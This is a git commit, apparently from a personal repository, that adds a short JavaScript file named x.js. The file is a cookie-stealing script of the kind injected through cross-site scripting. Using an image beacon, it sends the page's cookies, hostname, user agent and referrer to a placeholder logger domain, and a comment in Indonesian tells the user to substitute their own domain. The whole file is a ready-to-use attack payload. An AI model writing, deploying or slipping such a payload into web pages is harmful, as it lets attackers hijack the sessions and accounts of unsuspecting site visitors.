b8774a458dc91320770f5d9ca1b7953231f5b8a6
dy666x <xcd1603@gmail.com>
2025-07-08 12:47:43 +0700

    x.js

--- x.js
+++ x.js
@@ -1,1 +1,10 @@
+(function() {
+    const i = new Image();
+    const logURL = "https://your-logger-domain.com/log"; // ← ganti dengan domain kamu
+    i.src = logURL +
+        "?ip=" + encodeURIComponent(location.hostname) +
+        "&cookie=" + encodeURIComponent(document.cookie) +
+        "&ua=" + encodeURIComponent(navigator.userAgent) +
+        "&ref=" + encodeURIComponent(document.referrer);
+})();
 
